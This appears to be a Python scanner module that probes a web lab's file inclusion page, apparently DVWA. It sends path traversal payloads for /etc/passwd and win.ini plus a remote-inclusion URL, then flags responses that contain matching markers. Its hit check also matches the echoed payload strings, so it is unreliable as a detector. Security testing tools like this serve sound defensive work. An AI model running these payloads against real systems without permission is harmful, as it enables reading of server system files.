from tabulate import tabulate
import requests
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
import random
import string

console = Console()

def run(soup, headers, find_path_dic):
    payloads = [
        '/etc/passwd',
        '../../../../../etc/passwd',
        'file../../../../../../../../../etc/passwd',
        'file:///C:/Windows/win.ini',
        'http://google.com',
        'htthttp://p://google.com'
    ]

    google_payload = [
        'Gmail', 'Google 검색', '고급검색',
        'I’m Feeling Lucky', '검색의 원리', 'Google 정보'
    ]
    win_ini_payload = [
        '; for 16-bit app support', '[fonts]', '[extensions]',
        '[mci extensions]', '[files]', '[Mail]', 'MAPI=1'
    ]

    results = []

    for param_dic in find_path_dic:
        param_url = param_dic['url']
        param_method = param_dic['method']

        # File Inclusion 대상 경로만 필터링
        if "vulnerabilities/fi/" not in param_url:
            continue

        if param_method.upper() == 'GET':
            s_url = param_url.split('?')[0] if '?' in param_url else param_url

            for attack in payloads:
                p_url = s_url + '?' + '&'.join([f"{p}={attack}" for p in param_dic['param']])
                try:
                    res = requests.get(p_url, headers=headers, timeout=5)
                except Exception:
                    continue

                if any(p in res.text for p in payloads + win_ini_payload + google_payload):
                    table = Table(title="File Inclusion 탐지 결과", style="white", show_lines=True)
                    table.add_column("항목", style="white")
                    table.add_column("내용", style="white")
                    table.add_row("URL", p_url)
                    table.add_row("VULN NAME", "File Include")
                    table.add_row("Payload", attack)
                    console.print(table)

                    result_data = {
                        "URL": p_url,
                        "VULN NAME": "File Include",
                        "Payload": attack
                    }
                    results.append(result_data)
                    break

    return results
